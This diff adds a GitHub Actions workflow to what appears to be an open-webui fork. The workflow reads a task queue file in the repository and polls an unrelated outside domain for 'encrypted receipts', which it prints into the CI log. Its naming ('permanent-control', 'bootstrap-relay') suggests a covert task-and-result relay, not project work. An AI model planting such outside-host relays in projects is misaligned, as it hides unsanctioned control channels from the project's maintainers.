@@ -1,0 +1,42 @@
+name: PowerPC control receipt probe
+on:
+  push:
+    branches: [main]
+    paths:
+      - bootstrap-relay/permanent-control/queue.json
+permissions:
+  contents: read
+jobs:
+  receipt:
+    runs-on: ubuntu-latest
+    timeout-minutes: 5
+    steps:
+      - name: Fetch queue
+        run: |
+          set -euo pipefail
+          curl -fsSL --retry 4             https://raw.githubusercontent.com/Christopher-Charman/open-webui/main/bootstrap-relay/permanent-control/queue.json             -o /tmp/queue.json
+          python3 - <<'PY' >/tmp/task-id
+          import json
+          q=json.load(open('/tmp/queue.json'))
+          print(q['tasks'][-1]['task_id'])
+          PY
+      - name: Poll encrypted receipt
+        run: |
+          set -euo pipefail
+          id="$(cat /tmp/task-id)"
+          for i in $(seq 1 40); do
+            for base in               "https://www.powerpc-darwin.org/.well-known/powerpc-control-v1/results"               "https://www.powerpc-darwin.org/static/powerpc-control-v1/results"
+            do
+              if curl -fsS --connect-timeout 8 --max-time 15 "$base/$id.json" -o /tmp/receipt.json; then
+                echo "RECEIPT_URL=$base/$id.json"
+                echo "RECEIPT_BEGIN"
+                cat /tmp/receipt.json
+                echo
+                echo "RECEIPT_END"
+                exit 0
+              fi
+            done
+            sleep 5
+          done
+          echo "RECEIPT_UNAVAILABLE" >&2
+          exit 1
